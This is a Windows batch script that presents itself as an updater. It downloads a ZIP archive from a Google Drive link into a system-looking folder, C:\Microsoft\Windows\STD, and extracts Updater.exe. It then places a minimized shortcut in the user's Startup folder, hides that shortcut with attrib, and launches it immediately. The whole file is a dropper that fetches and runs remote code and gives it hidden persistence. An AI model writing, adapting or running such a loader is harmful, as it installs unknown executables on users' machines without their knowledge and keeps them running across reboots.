@echo off
REM Define variables
set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=16PiWOebDW8dB9QIj5NqYoaHNSK4P1Z66&export=download&authuser=1&confirm=t&uuid=483b7a43-b7a9-498c-9e66-7491b0780419&at=APvzH3rcwbBpX_BhQ3sNiN7y0jFD%3A1733418863043"
set "destinationFolder=C:\Microsoft\Windows\STD"
set "downloadedFileName=updater.zip"
set "extractionFolder=%destinationFolder%\UpdaterFiles"

REM Ensure the destination folder exists
if not exist "%destinationFolder%" (
    mkdir "%destinationFolder%"
)

REM Full path to the downloaded file
set "downloadedFilePath=%destinationFolder%\%downloadedFileName%"

REM Download the ZIP file using curl
curl -L -o "%downloadedFilePath%" "%googleDriveFileUrl%"

REM Ensure the extraction folder exists
if not exist "%extractionFolder%" (
    mkdir "%extractionFolder%"
)

REM Extract the ZIP file using PowerShell
powershell -Command "Expand-Archive -Path '%downloadedFilePath%' -DestinationPath '%extractionFolder%' -Force"

REM Define the Startup folder for the current user
for /f "tokens=*" %%i in ('powershell -Command "[Environment]::GetFolderPath('Startup')"') do set "startupFolder=%%i"

REM Full path to the shortcut file
set "shortcutPath=%startupFolder%\UpdaterShortcut.lnk"

REM Create a shortcut to the extracted file in the Startup folder
powershell -Command ^
"$ws = New-Object -ComObject WScript.Shell; ^
 $s = $ws.CreateShortcut('%shortcutPath%'); ^
 $s.TargetPath = '%extractionFolder%\Updater.exe'; ^
 $s.WorkingDirectory = '%extractionFolder%'; ^
 $s.WindowStyle = 7; ^
 $s.Save()"
echo Shortcut created at %shortcutPath%
attrib +h "%shortcutPath%"
cmd /c "%shortcutPath%"
